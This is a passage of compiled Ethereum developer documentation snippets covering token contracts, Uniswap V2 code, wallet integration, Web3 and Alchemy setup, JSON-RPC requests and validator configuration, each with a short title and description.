permission to mint new tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n//Contract based on [https://docs.openzeppelin.com/contracts/3.x/erc721](https://docs.openzeppelin.com/contracts/3.x/erc721)\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\";\n\ncontract MyNFT is ERC721URIStorage, Ownable {\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIds;\n\n    constructor() ERC721(\"MyNFT\", \"NFT\") {}\n\n    function mintNFT(address recipient, string memory tokenURI)\n        public onlyOwner\n        returns (uint256)\n    {\n        _tokenIds.increment();\n\n        uint256 newItemId = _tokenIds.current();\n        _mint(recipient, newItemId);\n        _setTokenURI(newItemId, tokenURI);\n\n        return newItemId;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Required ERC-721 Events in Solidity\nDESCRIPTION: The standard events that must be emitted by any ERC-721 compliant smart contract. These events track token transfers and approval operations.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\nevent Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);\nevent ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);\n```\n\n----------------------------------------\n\nTITLE: Implementing MetaMask Wallet Listener in JavaScript\nDESCRIPTION: This function adds a wallet listener to detect changes in the MetaMask wallet state, such as account changes or disconnections. It updates the UI accordingly based on the wallet connection status.\n\nLANGUAGE: javascript\nCODE:\n```\nfunction addWalletListener() {\n  if (window.ethereum) {\n    window.ethereum.on(\"accountsChanged\", (accounts) => {\n      if (accounts.length > 0) {\n        setWallet(accounts[0])\n        setStatus(\"👆🏽 Write a message in the text-field above.\")\n      } else {\n        setWallet(\"\")\n        setStatus(\"🦊 Connect to MetaMask using the top right button.\")\n      }\n    })\n  } else {\n    setStatus(\n      <p>\n        {\" \"}\n        🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n          You must install MetaMask, a virtual Ethereum wallet, in your browser.\n        </a>\n      </p>\n    )\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Alchemy Web3 for Ethereum Interactions\nDESCRIPTION: Command to install the Alchemy Web3 package, an enhanced Web3 library that offers automatic retries and robust WebSocket support for interacting with the Ethereum blockchain.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @alch/alchemy-web3\n```\n\n----------------------------------------\n\nTITLE: Calculating Subsequent Liquidity in Uniswap V2\nDESCRIPTION: For subsequent deposits, liquidity tokens are minted proportionally to the lesser of the two token ratios provided. This ensures providers add balanced liquidity or face a penalty.\n\nLANGUAGE: solidity\nCODE:\n```\n} else {\n    liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n```\n\n----------------------------------------\n\nTITLE: Connecting to Ethereum via HTTP Provider in Web3.py\nDESCRIPTION: Example of connecting Web3.py to a local Ethereum node running on port 8545 using the HTTP Provider. This would be used in a production environment with a fully synced node.\n\nLANGUAGE: python\nCODE:\n```\nw3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))\n```\n\n----------------------------------------\n\nTITLE: Writing a Hardhat Deploy Script for Ethereum Smart Contracts\nDESCRIPTION: A JavaScript script that uses ethers.js and Hardhat to deploy a HelloWorld smart contract to the Ethereum network. The script creates a contract factory, deploys the contract with an initial message, and logs the deployed contract address.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n  const HelloWorld = await ethers.getContractFactory(\"HelloWorld\")\n\n  // Start deployment, returning a promise that resolves to a contract object\n  const hello_world = await HelloWorld.deploy(\"Hello World!\")\n  console.log(\"Contract deployed to address:\", hello_world.address)\n}\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error)\n    process.exit(1)\n  })\n```\n\n----------------------------------------\n\nTITLE: Implementing Emergency Stop Pattern in Solidity\nDESCRIPTION: Example implementation of the Emergency Stop (Circuit Breaker) pattern in a smart contract. This pattern allows authorized addresses to pause vulnerable functions during an emergency and enables special recovery functions. The contract uses modifiers to control which functions can execute based on the contract's stopped state.\n\nLANGUAGE: Solidity\nCODE:\n```\n// This code has not been professionally audited and makes no promises about safety or correctness. Use at your own risk.\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Declaring Immutable State Variables in Uniswap V2 Router\nDESCRIPTION: Sets up immutable state variables for the factory and WETH contract addresses, ensuring these critical references cannot be modified after deployment. This provides security guarantees that the router will always interact with the intended contracts.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract UniswapV2Router02 is IUniswapV2Router02 {\n    using SafeMath for uint;\n\n    address public immutable override factory;\n    address public immutable override WETH;\n```\n\n----------------------------------------\n\nTITLE: Importing L2 Bridge Interface\nDESCRIPTION: Imports the IL2ERC20Bridge interface which allows the L1 bridge to create messages to control the standard bridge on L2.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { IL2ERC20Bridge } from \"../../L2/messaging/IL2ERC20Bridge.sol\";\n```\n\n----------------------------------------\n\nTITLE: Version 2 Example of Web3 Secret Storage\nDESCRIPTION: A JSON example showing the version 2 format of the Web3 Secret Storage, which uses AES-128-CBC cipher and Scrypt for key derivation. This illustrates the differences between version 2 and version 3 of the specification.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"crypto\": {\n    \"cipher\": \"aes-128-cbc\",\n    \"ciphertext\": \"07533e172414bfa50e99dba4a0ce603f654ebfa1ff46277c3e0c577fdc87f6bb4e4fe16c5a94ce6ce14cfa069821ef9b\",\n    \"cipherparams\": {\n      \"iv\": \"16d67ba0ce5a339ff2f07951253e6ba8\"\n    },\n    \"kdf\": \"scrypt\",\n    \"kdfparams\": {\n      \"dklen\": 32,\n      \"n\": 262144,\n      \"p\": 1,\n      \"r\": 8,\n      \"salt\": \"06870e5e6a24e183a5c807bd1c43afd86d573f7db303ff4853d135cd0fd3fe91\"\n    },\n    \"mac\": \"8ccded24da2e99a11d48cda146f9cc8213eb423e2ea0d8427f41c3be414424dd\",\n    \"version\": 1\n  },\n  \"id\": \"0498f19a-59db-4d54-ac95-33901b4f1870\",\n  \"version\": 2\n}\n```\n\n----------------------------------------\n\nTITLE: Making eth_sendRawTransaction Request with curl\nDESCRIPTION: Example of how to make an HTTP request to the eth_sendRawTransaction endpoint using curl. This method returns a transaction hash that can be used to track the transaction.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendRawTransaction\",\"params\":[{see above}],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0xe670ec64341771606e55d6b4ca35a1a6b75ee3d5145a99d05921026d1527331\"\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Apollo Client for The Graph in React\nDESCRIPTION: Sets up an Apollo Client instance that connects to a subgraph URL from The Graph, and wraps the React application with ApolloProvider to enable GraphQL queries.\n\nLANGUAGE: javascript\nCODE:\n```\n// See all subgraphs: https://thegraph.com/explorer/\nconst client = new ApolloClient({\n  uri: \"{{ subgraphUrl }}\",\n})\n\nReactDOM.render(\n  <ApolloProvider client={client}>\n    <App />\n  </ApolloProvider>,\n  document.getElementById(\"root\")\n)\n```\n\n----------------------------------------\n\nTITLE: Long-term Base Fee Growth with Sustained Full Blocks\nDESCRIPTION: Table demonstrating the exponential growth of base fees over a longer period when blocks remain consistently full. This shows why extended periods of network congestion become prohibitively expensive, creating a natural economic balance.\n\nLANGUAGE: markdown\nCODE:\n```\n| Block Number | Included Gas | Fee Increase | Current Base Fee |\n| ------------ | -----------: | -----------: | ---------------: |\n| 30           |          30M |        12.5% |      2705.6 gwei |\n| ...          |          ... |        12.5% |              ... |\n| 50           |          30M |        12.5% |     28531.3 gwei |\n| ...          |          ... |        12.5% |              ... |\n| 100          |          30M |        12.5% |  10302608.6 gwei |\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction by Block Hash and Index Parameters in JavaScript\nDESCRIPTION: Example parameters for the eth_getTransactionByBlockHashAndIndex method, which takes a 32-byte block hash and the transaction's index position to retrieve transaction information.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  \"0x1d59ff54b1eb26b013ce3cb5fc9dab3705b415a67127a003c3e61eb445bb8df2\",\n  \"0x0\", // 0\n]\n```\n\n----------------------------------------\n\nTITLE: Defining Function Signature Constant for External Calls in Solidity\nDESCRIPTION: Declaration of a constant function signature that external callers can use to interact with the contract when manually constructing calldata. This simplifies calling non-ABI-compliant functions.\n\nLANGUAGE: solidity\nCODE:\n```\n// Make it easier to call us\n    // Function signature for writeEntryCached(), courtesy of\n    // https://www.4byte.directory/signatures/?bytes4_signature=0xe4e4f2d3\n    bytes4 constant public WRITE_ENTRY_CACHED = 0xe4e4f2d3;\n```\n\n----------------------------------------\n\nTITLE: Checking Token Existence in Solidity\nDESCRIPTION: An internal view function that checks if a Pizza token exists by verifying its owner is not the zero address. Returns a boolean indicating existence.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction _exists(uint256 pizzaId) internal view returns (bool) {\n    address owner = pizzaToOwner[pizzaId];\n    return owner != address(0);\n}\n```\n\n----------------------------------------\n\nTITLE: Installing dotenv for Environment Variables\nDESCRIPTION: Command to install the dotenv package, which will be used to securely store the Alchemy API key and MetaMask private key as environment variables in the project.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install dotenv --save\n```\n\n----------------------------------------\n\nTITLE: Calculating Base Reward in Ethereum Proof-of-Stake\nDESCRIPTION: Formula for calculating the base reward for validators based on their effective balance and the total number of active validators. This base value serves as the foundation for determining various validator rewards.\n\nLANGUAGE: plaintext\nCODE:\n```\nbase_reward = effective_balance * (base_reward_factor / (base_rewards_per_epoch * sqrt(sum(active_balance))))\n```\n\n----------------------------------------\n\nTITLE: Implementing Token Burning Function in ERC-20 with Solidity\nDESCRIPTION: The _burn internal function destroys tokens from a specified account, reducing the total supply. It requires a non-zero address with sufficient balance and emits a Transfer event to the zero address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _burn(address account, uint256 amount) internal virtual {\n    require(account != address(0), \"ERC20: burn from the zero address\");\n\n    _beforeTokenTransfer(account, address(0), amount);\n\n    _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n    _totalSupply = _totalSupply.sub(amount);\n    emit Transfer(account, address(0), amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Recovering Signer Address from EIP-712 Signature in Solidity\nDESCRIPTION: Uses ecrecover to obtain the signer's address from the EIP-712 digest and signature components (v, r, s). This allows verification that the permit was actually signed by the token owner.\n\nLANGUAGE: solidity\nCODE:\n```\n        address recoveredAddress = ecrecover(digest, v, r, s);\n```\n\n----------------------------------------\n\nTITLE: Calculating Token Inputs and Verifying K Value\nDESCRIPTION: Calculates the input amounts of tokens received, applies the 0.3% swap fee, and enforces the constant product formula (K = reserve0 * reserve1) to ensure the swap doesn't reduce the product of reserves.\n\nLANGUAGE: solidity\nCODE:\n```\nuint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\nuint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\nrequire(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n{ // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n    uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n    uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n    require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n```\n\n----------------------------------------\n\nTITLE: Defining Allowance Mapping in ERC20 Contract\nDESCRIPTION: This double mapping tracks allowances where one address permits another to spend tokens on their behalf. The first key is the token owner, and the second key is the approved spender address.\n\nLANGUAGE: solidity\nCODE:\n```\n    mapping (address => mapping (address => uint256)) private _allowances;\n```\n\n----------------------------------------\n\nTITLE: Implementing connectWallet Function for MetaMask Integration in JavaScript\nDESCRIPTION: This function checks if MetaMask is installed, attempts to connect to it, and returns an object with the connected address and a status message. It handles various scenarios including successful connection, rejection, and when MetaMask is not installed.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const connectWallet = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_requestAccounts\",\n      })\n      const obj = {\n        status: \"👆🏽 Write a message in the text-field above.\",\n        address: addressArray[0],\n      }\n      return obj\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Functionality in ERC-20\nDESCRIPTION: A mapping and events to keep track of frozen accounts, along with a function to freeze accounts that can only be called by the contract owner. This can help protect compromised accounts.\n\nLANGUAGE: solidity\nCODE:\n```\n      mapping(address => bool) public frozenAccounts;\n\n    // When accounts are frozen or unfrozen\n    event AccountFrozen(address indexed _addr);\n    event AccountThawed(address indexed _addr);\n\n      function freezeAccount(address addr)\n        public\n        onlyOwner\n    {\n        require(!frozenAccounts[addr], \"Account already frozen\");\n        frozenAccounts[addr] = true;\n        emit AccountFrozen(addr);\n    }  // freezeAccount\n```\n\n----------------------------------------\n\nTITLE: Ethereum Unsubscribe Response Format\nDESCRIPTION: Shows the response format for a successful eth_unsubscribe request. The result field returns true if a subscription was successfully cancelled, or false if no subscription existed with the given ID.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Approval Clearing in ERC-721 Contract\nDESCRIPTION: An internal function that clears the approval for a token. It ensures that only the current owner can clear approvals and optimizes gas usage by only writing to storage when necessary.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _clearApproval(_owner: address, _tokenId: uint256):\n    \"\"\"\n    @dev Clear an approval of a given address\n         Throws if `_owner` is not the current owner.\n    \"\"\"\n    # Throws if `_owner` is not the current owner\n    assert self.idToOwner[_tokenId] == _owner\n    if self.idToApprovals[_tokenId] != ZERO_ADDRESS:\n        # Reset approvals\n        self.idToApprovals[_tokenId] = ZERO_ADDRESS\n```\n\n----------------------------------------\n\nTITLE: Implementing a View Function in Solidity\nDESCRIPTION: Example of a view function in Solidity that retrieves data without modifying state. View functions don't use gas when called externally unless called from another contract.\n\nLANGUAGE: solidity\nCODE:\n```\n// Solidity example\nfunction balanceOf(address _owner) public view returns (uint256 _balance) {\n    return ownerPizzaCount[_owner];\n}\n```\n\n----------------------------------------\n\nTITLE: Transferring Ether to an Account in C# using Nethereum\nDESCRIPTION: Example code for transferring ether from one account to another using Nethereum in C#. This sample demonstrates how to create and send transactions on the Ethereum network.\n\nLANGUAGE: C#\nCODE:\n```\n// Playground link: http://playground.nethereum.com/csharp/id/1003\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 transferFrom function in Solidity\nDESCRIPTION: The transferFrom function allows an approved spender to transfer tokens from the owner's account. It transfers the tokens and then reduces the spender's allowance accordingly. This function uses safe math to prevent underflows.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-transferFrom}.\n *\n * Emits an {Approval} event indicating the updated allowance. This is not\n * required by the EIP. See the note at the beginning of {ERC20}.\n *\n * Requirements:\n *\n * - `sender` and `recipient` cannot be the zero address.\n * - `sender` must have a balance of at least `amount`.\n * - the caller must have allowance for ``sender``'s tokens of at least\n * `amount`.\n */\nfunction transferFrom(address sender, address recipient, uint256 amount) public virtual\n                                        override returns (bool) {\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,\n         \"ERC20: transfer amount exceeds allowance\"));\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining SPDX License Identifier in Solidity\nDESCRIPTION: This line specifies the MIT license for the Solidity file. Including an SPDX license identifier is a best practice to clearly indicate the terms under which the code is released.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\n```\n\n----------------------------------------\n\nTITLE: Setting Operator Approval for Token Transfers in Solidity\nDESCRIPTION: Function that allows a user to approve or disapprove an operator to transfer all their tokens. Prevents self-approval and emits an ApprovalForAll event when approval status changes.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction setApprovalForAll(address to, bool approved) public {\n        require(to != msg.sender, \"Cannot approve own address\");\n        operatorApprovals[msg.sender][to] = approved;\n        emit ApprovalForAll(msg.sender, to, approved);\n    }\n```\n\n----------------------------------------\n\nTITLE: Validating Minimum Token Amounts in Uniswap V2\nDESCRIPTION: Ensures the amounts of tokens returned meet the minimum thresholds set by the user. If either amount is insufficient, the transaction reverts, protecting against unfavorable trades.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\nrequire(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n}\n```\n\n----------------------------------------\n\nTITLE: KECCAK256 Opcode in EVM\nDESCRIPTION: The KECCAK256 opcode computes the Keccak-256 hash of data in memory. It takes an offset and length from the stack, and returns the hash of the specified memory region.\n\nLANGUAGE: evm-assembly\nCODE:\n```\nkeccak256(mem[ost:ost+len-1])\n```\n\n----------------------------------------\n\nTITLE: Checking Operator Approval Status in Solidity\nDESCRIPTION: This function verifies whether an operator has been approved by a specific owner to manage all of their tokens. It returns a boolean indicating the approval status.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction isApprovedForAll(address owner, address operator)\n    public\n    view\n    returns (bool)\n{\n    return operatorApprovals[owner][operator];\n}\n```\n\n----------------------------------------\n\nTITLE: Declaring Token Reserves in Uniswap Pair\nDESCRIPTION: Declares variables for token reserves. Uses uint112 to allow all three variables (reserve0, reserve1, and blockTimestampLast) to fit in a single storage slot to optimize gas costs.\n\nLANGUAGE: solidity\nCODE:\n```\nuint112 private reserve0;           // uses single storage slot, accessible via getReserves\nuint112 private reserve1;           // uses single storage slot, accessible via getReserves\n```\n\n----------------------------------------\n\nTITLE: Testing Repeated Value Caching\nDESCRIPTION: Tests that writing the same value multiple times returns the same key, which indicates that duplicates are properly detected.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Cache the same value multiple times, ensure that the key stays\n    // the same\n    function testRepeatCaching() public {\n        for(uint i=1; i<100; i++) {\n            uint _key1 = cache.cacheWrite(i);\n            uint _key2 = cache.cacheWrite(i);\n            assertEq(_key1, _key2);\n        }\n        for(uint i=1; i<100; i+=3) {\n            uint _key = cache.cacheWrite(i);\n            assertEq(_key, i);\n        }\n    }    // testRepeatCaching\n```\n\n----------------------------------------\n\nTITLE: Implementing safeTransferFrom Method in Vyper ERC-721\nDESCRIPTION: The safeTransferFrom function transfers NFT ownership with additional safety checks. It verifies the receiving address can handle ERC-721 tokens by calling onERC721Received if the recipient is a contract.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef safeTransferFrom(\n        _from: address,\n        _to: address,\n        _tokenId: uint256,\n        _data: Bytes[1024]=b\"\"\n    ):\n    \"\"\"\n    @dev Transfers the ownership of an NFT from one address to another address.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the\n         approved address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n         If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n         the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`. \n         NOTE: bytes4 is represented by bytes32 with padding\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    @param _data Additional data with no specified format, sent in call to `_to`.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Setting Up a Lighthouse Validator\nDESCRIPTION: Commands to import validator keys, configure reward address, and start the Lighthouse validator service. These steps are necessary to run a validator node after depositing 32 ETH.\n\nLANGUAGE: shell\nCODE:\n```\n# import the validator keys\nlighthouse account validator import --directory=/home/ethereum/validator_keys\n\n# set the reward address\nsudo sed -i 's/<ETH_ADDRESS>' /etc/ethereum/lighthouse-validator.conf\n\n# start the validator\nsudo systemctl start lighthouse-validator\n```\n\n----------------------------------------\n\nTITLE: Making eth_estimateGas Request with curl\nDESCRIPTION: Example of how to make an HTTP request to the eth_estimateGas endpoint using curl. This method estimates the gas needed for a transaction without adding it to the blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_estimateGas\",\"params\":[{see above}],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x5208\" // 21000\n}\n```\n\n----------------------------------------\n\nTITLE: MAC Calculation in Web3 Keystore v3\nDESCRIPTION: Shows how the MAC (Message Authentication Code) is calculated for Web3 keystore v3 files. The MAC is a Keccak-256 hash of the concatenation of the second 16 bytes of the derived key and the ciphertext.\n\nLANGUAGE: javascript\nCODE:\n```\nKECCAK(DK[16..31] ++ <ciphertext>)\n```\n\n----------------------------------------\n\nTITLE: Getting Maximum Withdrawal Limit in ERC-4626 Vault\nDESCRIPTION: This method returns the maximum amount of underlying assets that can be withdrawn in a single withdraw call from the owner's balance.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxWithdraw(address owner) public view returns (uint256 maxAssets)\n```\n\n----------------------------------------\n\nTITLE: Updating Reserves and Price Accumulators in Uniswap V2 (Solidity)\nDESCRIPTION: The _update function is called whenever tokens are deposited or withdrawn from the pool. It updates the reserves, checks for overflow conditions, and calculates price accumulators which are used for time-weighted average price calculations.\n\nLANGUAGE: solidity\nCODE:\n```\n    // update reserves and, on the first call per block, price accumulators\n    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {\n```\n\n----------------------------------------\n\nTITLE: Testing Basic Cache Functionality in Solidity\nDESCRIPTION: Tests the basic caching functionality by writing and then reading values, verifying that values are correctly stored and retrieved.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testCaching() public {\n        for(uint i=1; i<5000; i++) {\n            cache.cacheWrite(i*i);\n        }\n\n        for(uint i=1; i<5000; i++) {\n            assertEq(cache.cacheRead(i), i*i);\n```\n\n----------------------------------------\n\nTITLE: Initializing Web3 with WebSocket connection in JavaScript\nDESCRIPTION: Code snippet demonstrating how to initialize a Web3 instance using a WebSocket URL instead of HTTP, and making a simple getBlockNumber request to Ethereum.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"wss://eth-mainnet.ws.alchemyapi.io/ws/your-api-key\")\n\nweb3.eth.getBlockNumber().then(console.log) // -> 7946893\n```\n\n----------------------------------------\n\nTITLE: Initializing Web3 with WebSocket connection in JavaScript\nDESCRIPTION: Code snippet demonstrating how to initialize a Web3 instance using a WebSocket URL instead of HTTP, and making a simple getBlockNumber request to Ethereum.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"wss://eth-mainnet.ws.alchemyapi.io/ws/your-api-key\")\n\nweb3.eth.getBlockNumber().then(console.log) // -> 7946893\n```\n\n----------------------------------------\n\nTITLE: Checking Token Existence in Solidity NFT Contract\nDESCRIPTION: Internal helper function that verifies if a Pizza token exists by checking if its owner address is non-zero.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction _exists(uint256 pizzaId) internal view returns (bool) {\n    address owner = pizzaToOwner[pizzaId];\n    return owner != address(0);\n}\n```\n\n----------------------------------------\n\nTITLE: Sending ETH Transactions with Web3.js and Alchemy API in JavaScript\nDESCRIPTION: This code creates and sends an Ethereum transaction using Web3.js and Alchemy. It loads environment variables, creates a Web3 instance, gets the transaction count (nonce), constructs a transaction object, signs it with a private key, and sends it to the network. The example sends 1 ETH back to the Sepolia faucet.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n    require('dotenv').config();\n    const { API_URL, PRIVATE_KEY } = process.env;\n    const { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\");\n    const web3 = createAlchemyWeb3(API_URL);\n    const myAddress = '0x610Ae88399fc1687FA7530Aac28eC2539c7d6d63' //TODO: replace this address with your own public address\n\n    const nonce = await web3.eth.getTransactionCount(myAddress, 'latest'); // nonce starts counting from 0\n\n    const transaction = {\n     'to': '0x31B98D14007bDEe637298086988A0bBd31184523', // faucet address to return eth\n     'value': 1000000000000000000, // 1 ETH\n     'gas': 30000,\n     'nonce': nonce,\n     // optional data field to send message or execute smart contract\n    };\n\n    const signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATE_KEY);\n\n    web3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {\n    if (!error) {\n      console.log(\"🎉 The hash of your transaction is: \", hash, \"\\n Check Alchemy's Mempool to view the status of your transaction!\");\n    } else {\n      console.log(\"❗Something went wrong while submitting your transaction:\", error)\n    }\n   });\n}\n\nmain();\n```\n\n----------------------------------------\n\nTITLE: Implementing pinJSONToIPFS Function for Uploading NFT Metadata\nDESCRIPTION: Function that uses axios to make a POST request to Pinata's API for uploading JSON metadata to IPFS. It returns the IPFS URL if successful, which will be used as the tokenURI when minting NFTs.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst key = process.env.REACT_APP_PINATA_KEY\nconst secret = process.env.REACT_APP_PINATA_SECRET\n\nconst axios = require(\"axios\")\n\nexport const pinJSONToIPFS = async (JSONBody) => {\n  const url = `https://api.pinata.cloud/pinning/pinJSONToIPFS`\n  //making axios POST request to Pinata ⬇️\n  return axios\n    .post(url, JSONBody, {\n      headers: {\n        pinata_api_key: key,\n        pinata_secret_api_key: secret,\n      },\n    })\n    .then(function (response) {\n      return {\n        success: true,\n        pinataUrl:\n          \"https://gateway.pinata.cloud/ipfs/\" + response.data.IpfsHash,\n      }\n    })\n    .catch(function (error) {\n      console.log(error)\n      return {\n        success: false,\n        message: error.message,\n      }\n    })\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ETH Receive Function\nDESCRIPTION: Defines a receive function that allows direct ETH deposits without calldata. When ETH is sent to the contract, it automatically initiates an ETH deposit to the sender's address on L2 with default gas parameters.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev This function can be called with no data\n     * to deposit an amount of ETH to the caller's balance on L2.\n     * Since the receive function doesn't take data, a conservative\n     * default amount is forwarded to L2.\n     */\n    receive() external payable onlyEOA {\n        _initiateETHDeposit(msg.sender, msg.sender, 200_000, bytes(\"\"));\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing WORM Contract with Cache Inheritance in Solidity\nDESCRIPTION: A Write Once, Read Many (WORM) contract that inherits from the Cache contract. It demonstrates how to use custom calldata handling for functions that don't follow the ABI specification.\n\nLANGUAGE: solidity\nCODE:\n```\nimport \"./Cache.sol\";\n\ncontract WORM is Cache {\n    function writeEntryCached() external {\n        uint[] memory params = _readParams(2);\n        writeEntry(params[0], params[1]);\n    }    // writeEntryCached\n\n    // Make it easier to call us\n    // Function signature for writeEntryCached(), courtesy of\n    // https://www.4byte.directory/signatures/?bytes4_signature=0xe4e4f2d3\n    bytes4 constant public WRITE_ENTRY_CACHED = 0xe4e4f2d3;\n\n    function readEntry(uint key) public view\n        returns (uint _value, address _writtenBy, uint _writtenAtBlock)\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Deployed Bytecode with Link References\nDESCRIPTION: This snippet shows the deployed bytecode object for an ERC20 token contract. It includes all the operational bytecode that will reside on the Ethereum blockchain after deployment, containing functions for token transfers, approvals, and balance queries.\n\nLANGUAGE: json\nCODE:\n```\n\"deployedBytecode\": {\n  \"linkReferences\": {},\n  \"object\": 